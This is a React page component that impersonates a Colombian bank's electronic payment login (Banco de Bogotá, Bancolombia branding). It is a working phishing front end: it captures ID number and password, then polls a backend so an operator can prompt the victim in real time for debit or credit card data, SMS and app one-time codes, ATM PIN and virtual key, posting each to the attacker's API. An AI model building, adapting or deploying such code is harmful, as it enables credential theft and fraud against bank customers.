"use client"
import "./occidente.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useRef, useState } from "react"
import axios from "axios"

const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
const COLOR_PRINCIPAL_BACK = "bg-[#072146]"
const back_color = "bg-[#ffffff]"
const text_color_principal = "text-black"
const ESTILO_BTN_PRINCIPAL = `w-full font-bold py-2 px-6 bg-[#0041a8] text-white rounded-full disabled:bg-gray-200 disabled:text-gray-500 cursor-not-allowed`

const svg = (
    <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
)

const svgPassword = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const btn = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#0041a8] border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

const InputAnimado = ({
    label,
    borderCol = "border-0", 
    borderColSelec = "", 
    borderColError, 
    errorLabel, 
    name,
    handler, 
    value, 
    error=false, 
    modoNumerico=false, 
    type="text", 
    backGraundInput="bg-white",
    contenBtn = null,
    btn = false,
    labelColor = "text-black",
    labelColorSelect = "",
    labelErrorColor = "text-red-600",
    placeHolder = "",
    svg = null
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const shouldFloat = isFocused || value !== "";
  const [mostrarPasword, setMostrarPasword] = useState(false)


  return (
    <div className="w-full flex flex-col">
        <div className={`w-full flex mt-1.5 ${isFocused ? "border border-[#0041a8]":"border border-slate-300"}`}>
            <input
                inputMode={modoNumerico ? "numeric" : "text"}
                name={name}
                type={ type == "password" ? mostrarPasword ? "text": "password" : type}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                onChange={(e) => handler(e)}
                className={`py-1 px-2.5 outline-none ${type == "password" ? "w-[90%]" : "w-full"} `}
                placeholder={placeHolder}
                value={value}
                />
            {type == "password" && 
                <button onClick={()=> setMostrarPasword(p => !p)} className={" text-slate-400"}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-eye-slash" viewBox="0 0 16 16">
                        <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7 7 0 0 0-2.79.588l.77.771A6 6 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755q-.247.248-.517.486z"/>
                        <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829"/>
                        <path d="M3.35 5.47q-.27.24-.518.487A13 13 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7 7 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12z"/>
                    </svg>
                </button>
            }
        </div>
        {error && <span className={`text-[12px] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
    </div>
  );
}

const SelectMinimalista = ({
  label,
  errorLabel,
  name,
  labelColor,
  borderCol, 
  borderColSelec,
  handler,
  borderColError,
  arrayDatos,
  error=false,
  backGraundInput="bg-white",
  border = "border-b-2",
  colorSvg = "text-slate-500"
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedItem, setSelectedItem] = useState(typeof arrayDatos[0] === "object" ? arrayDatos[0].value : arrayDatos[0]);
  const [highlightedIndex, setHighlightedIndex] = useState(0);
  const containerRef = useRef();

  const toggleDropdown = () => setIsOpen(prev => !prev);
    console.log(arrayDatos);
    
  const handleSelect = (value) => {
    setSelectedItem(value);
    handler({ target: { name, value } });
    setIsOpen(false);
  };

  const handleClickOutside = (e) => {
    if (containerRef.current && !containerRef.current.contains(e.target)) {
      setIsOpen(false);
    }
  };

  const handleKeyDown = (e) => {
    if (!isOpen) {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        setIsOpen(true);
      }
      return;
    }

    if (e.key === "ArrowDown") {
      e.preventDefault();
      setHighlightedIndex((prev) => (prev + 1) % arrayDatos.length);
    }

    if (e.key === "ArrowUp") {
      e.preventDefault();
      setHighlightedIndex((prev) =>
        prev === 0 ? arrayDatos.length - 1 : prev - 1
      );
    }

    if (e.key === "Enter") {
      e.preventDefault();
      handleSelect(arrayDatos[highlightedIndex]);
    }

    if (e.key === "Escape") {
      setIsOpen(false);
    }
  };

  useEffect(() => {
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  return (
    <div className={`w-full flex flex-col`} >
        <span className={`${labelColor} pl-2 text-[12px]`}>{label}</span>
        <div
        ref={containerRef}
        tabIndex={0}
        onClick={toggleDropdown}
        onKeyDown={handleKeyDown}
        className={`w-full flex flex-col pl-2 relative cursor-pointer outline-none ${error ? borderColError : borderCol}`}
        >
        <div className="w-full flex justify-between items-center border mt-1.5 px-1 py-0.5 border-slate-300">
            <span className="ml-2 text-[13px]">{selectedItem}</span>
            <div className={`${colorSvg} transform transition-transform py-1.5 duration-300 ${!isOpen ? "rotate-180": ""}`}>
            <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="currentColor" className="bi bi-chevron-up" viewBox="0 0 16 16">
                <path fillRule="evenodd" d="M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708z"/>
            </svg>
            </div>
        </div>

        {isOpen && (
            <div
            className={`w-[57vw] p-2 z-20 absolute bg-[#021f47] py-2.5 left-2 top-10 flex flex-col  rounded-lg gap gap-y-1`}
            >
            {arrayDatos.map((d, k) => (
                <button
                key={k}
                type="button"
                onClick={(e) => {
                    e.stopPropagation();
                    handleSelect(typeof d === "object" ? d.value : d);
                }}
                className={`text-[14px] text-white text-start flex items-center pr-1 gap gap-x-1 py-1 px-2 rounded ${
                    (typeof d === "object" && selectedItem === d.value) || d === selectedItem ? "bg-[#0057cb]" : ""
                }`}
                >
                {typeof d === "object" ? d.string : d}
                </button>
            ))}
            </div>
        )}
        </div>
        {error && <span className="text-[14px] mt-1.5 text-red-600 font-medium">{errorLabel}</span>}
    </div>
  );
}



const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio, errorDatos}) =>{
    return(
        <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
            <span className="w-[90%] text-[14px] text-[#5c5c5c]">Identificación</span>
            <div className="w-[100vw] mt-0.5 flex gap gap-x-4">
                <div className="w-[20%] ml-[15%]">
                    <SelectMinimalista 
                        label={""}
                        labelColor={"text-[#5c5c5c]"}
                        name={"tipoDocumento"} 
                        handler={handlerInformacion}
                        colorSvg="text-[#0041a8]" 
                        value={datosInicio.numeroDocumento} 
                        arrayDatos={[{string:"C.C - Cédula de ciudadanía", value:"C.C"}, {string:"C.E - Cédula de extranjería", value:"C.E"}, {string:"PS - Pasaporte", value:"PS"}, {string:"T.I - Tarjeta de identidad", value:"T.I"}]} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                    />
                </div>
                <div className="w-[54%]">
                    <InputAnimado 
                        error={!!errorDatos.numeroDocumento}
                        errorLabel={errorDatos.numeroDocumento} 
                        label={""} 
                        modoNumerico={true}
                        type={"tel"} 
                        placeHolder="Ej: 1093238993"
                        name={"numeroDocumento"} 
                        handler={handlerCheck} 
                        value={datosInicio.numeroDocumento}
                    />
                </div>     
            </div>
            <div className="w-[100vw] flex flex-col">
                <span className="ml-[15%] text-[14px] text-[#5c5c5c]">Contraseña</span>
                <div className="ml-[18%] w-[75%]">
                    <InputAnimado 
                            error={!!errorDatos.contrasenia}
                            errorLabel={errorDatos.contrasenia} 
                            label={""} 
                            modoNumerico={true}
                            type={"password"} 
                            placeHolder=""
                            name={"contrasenia"} 
                            handler={handlerCheck} 
                            value={datosInicio.contrasenia}
                            
                        />
                </div>
            </div>
            <div className="w-full pt-6 pb-2 flex justify-between items-center">
                <button className="px-4 py-1.5 text-[11px] border border-slate-300 flex justify-between items-center rounded-sm font-bold">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0081ff" className="bi bi-arrow-left mr-1.5" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8"/>
                    </svg>
                    Volver al comercio
                </button>
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={"font-bold py-2 px-6 bg-[#0065dc] text-white text-[12px] rounded-sm disabled:text-gray-500 cursor-not-allowed"}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El campo es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            tipoDocumento:"",    
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    
    
    
    const handlerCheck = (e) => {
        const { name, value } = e.target;
        
        handlerInformacion(e);

        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El campo es requerido";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-full flex flex-col justify-center items-center pb-4">
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-[90%] flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
                <Usuario handlerInformacion={handlerInformacion} handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={handlerContinuar} />             
            </div>
        </div>
    )
}





export default function Bogota (){
    const [tipoUsuario, setTipoUsuario] = useState("personas")
    const [inicioSesion, setInicioSesion] = useState(false)
    const [selectVista, setSelectVisata] = useState(null)
    const [loading, setLoading] = useState(false)
    const [tituloError, setTituloError] = useState("")
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        console.log(e);
        
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        const inicioSesionfuncion = async ()=>{
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Bancolombia",
                informacion:{
                    tipoDocumento: datosInicio.tipoDocumento
                },
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            if(uniqId === "" ) {
                localStorage.setItem('uniqId', data.uniqid)
                setUniqId(data.uniqid)
            }
            setKey(k => k+1)
            setInicioSesion(true)
            setTituloError("")
            setGuardado(true)
            
        }
        if (btnInicio) {
            inicioSesionfuncion()
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;
        setTituloError("")
        try {
            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            console.log(selV.data.status);
            
            if (
                selV.data.status == "tdb" ||
                selV.data.status == "tdb-error" ||
                selV.data.status == "tdc" ||
                selV.data.status == "tdc-error" ||
                selV.data.status == "otpsms" ||
                selV.data.status == "otpsms-error" ||
                selV.data.status == "otpapp" ||
                selV.data.status == "otpapp-error" ||
                selV.data.status == "clavecajero" ||
                selV.data.status == "clavecajero-error" ||
                selV.data.status == "clavevirtual" ||
                selV.data.status == "clavevirtual-error" &&
                selV.data.status !== selectVista
            ) {
                setSelectVisata(selV.data.status);
                setKey(prev => prev + 1) 
                setLoading(false);
                return;
            }else if(selV.data.status == "fin"){
                setSelectVisata("compraExitosa")
                setLoading(false);
                return;
            }else if(selV.data.status == "error"){
                setSelectVisata("errorCompra")
                setLoading(false);
                return;

            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
                setDatosInicio({
                    numeroDocumento: "",
                    contrasenia:""
                })
                setSelectVisata(selV.data.status)
                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
                setKey(prev => prev + 1)
                setLoading(false);
                return;
            }
        } catch (error) {
            console.log(error);
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };
    if (guardado) {
        iniciarLongPolling()
    }

    return () => {
        isMounted = false;
    };
    }, [guardado, reLoad]);

    //mensje-otp
    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-sms`, {
                uniqid: uniqId,
                otpsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerloginError = async ()=>{
        try {
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Alianza",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    
    //otp-app
    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-app`, {
                uniqid: uniqId,
                otpapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //clave-cajero
    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-cajero`, {
                uniqid: uniqId,
                clavecajero: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    //clave-virtual
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-virtual`, {
                uniqid: uniqId,
                clavevirtual: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //tarjeta
    const handlerTarjeta = async (body) =>{
        try {
            setLoading(true)
            body.uniqid = uniqId
            const send = await axios.post(`/api/sesion/tarjeta`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
            setReLoad(r => r = !r)
        }
        
    }



    return(
        <div className={`w-full flex flex-col bg-white items-center justify-center`}>
            <div className={`w-full flex justify-center items-center py-3`}>
                <div className={`w-[98%] flex justify-end`}>
                    <div className="py-0.5 px-3 border border-gray-400 rounded-full flex items-center">
                        <svg width="15" height="15" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" fill="none">                        
                            <path
                                d="M30.5 6.1a26 26 0 0 1 20.4 11.3"
                                stroke="#00BFA6"
                                strokeWidth="2"
                                strokeLinecap="round"
                            />

                            <path
                                d="M13.1 43.1A26 26 0 0 0 33.5 58"
                                stroke="#00BFA6"
                                strokeWidth="2"
                                strokeLinecap="round"
                            />
                            <circle cx="50.5" cy="18" r="4" fill="#00BFA6"/>
                            <circle cx="50.5" cy="18" r="2" fill="white"/>
                            <circle cx="13.5" cy="43" r="4" fill="#00BFA6"/>
                            <circle cx="13.5" cy="43" r="2" fill="white"/>
                            <path
                                d="M32 20L24 24V32C24 36 27.3 40 32 42C36.7 40 40 36 40 32V24L32 20Z"
                                stroke="#00BFA6"
                                strokeWidth="2"
                                fill="none"
                            />
                        </svg>
                        <span className="text-[12px] text-gray-400">Seguridad</span>
                    </div> 
                </div>
            </div>


            <div className="w-full flex">
                <div className="min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
                    <div className="w-full flex justify-center">
                        <img src="/assets/occidente/header.svg" className="w-[55%] object-cover" alt="" />
                    </div>
                    <div className="w-full mt-2.5 flex flex-col justify-center items-center">
                        <span className="text-[12px] font-bold ">¡Bienvenido! a tus,</span>
                        <span className="text-[14px] font-bold text-[#0081ff]">Pagos Electrónicos</span>
                    </div>
                    {loading && <Loading/>}
                    {reLoad && <Loading/>}
                    {!inicioSesion &&  <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                    {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                    {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "otpsms" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "otpsms-error" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "otpapp" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "otpapp-error" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "clavecajero" && <Status key={key} tamInput={6} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "clavecajero-error" && <Status key={key} tamInput={6} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "clavevirtual" && <Status key={key} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    {selectVista == "clavevirtual-error" && <Status key={key} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                </div>
            </div>



            <div className="w-[70%] flex items-center justify-between mb-4">
                <img src="/assets/bogota/abajo.png" className="w-[20%] object-contain" alt="" />
                <span className="text-[9px] text-[#5c5c5c]">Banco de Bogotá - 2025</span>
            </div>
            <div className="w-full flex flex-col justify-center items-center bg-[linear-gradient(to_bottom,_#0074d3_-11%,_#0040a8)]  py-7">
                <div className="w-[90%] flex flex-col items-center justify-center">
                    <div className="w-full flex items-start border-b-1 pb-3 border-b-gray-500">
                        <div className="w-[70%] flex flex-col justify-center">
                            <span className="text-[15px] mb-1.5 font-semibold text-white">Tu seguridad es lo primero</span>
                            <span className="text-[12px] text-white">Sigue estos tips y tus transacciones estarán blindadas</span>
                        </div>
                        <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
                            </svg>
                        </div>
                    </div>
                    <div className="w-full flex items-start mt-5 pb-1.5 ">
                        <div className="w-[70%] flex flex-col justify-center">
                            <span className="text-[15px] mb-1.5 font-semibold text-white">Contáctanos </span>
                            <span className="text-[12px] text-white">Si tienes alguna duda o algo te ha sucedido usa nuestros canales</span>
                        </div>
                        <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
                            </svg>
                        </div>
                    </div>
                </div>                      
           </div>             
        </div>
    )
}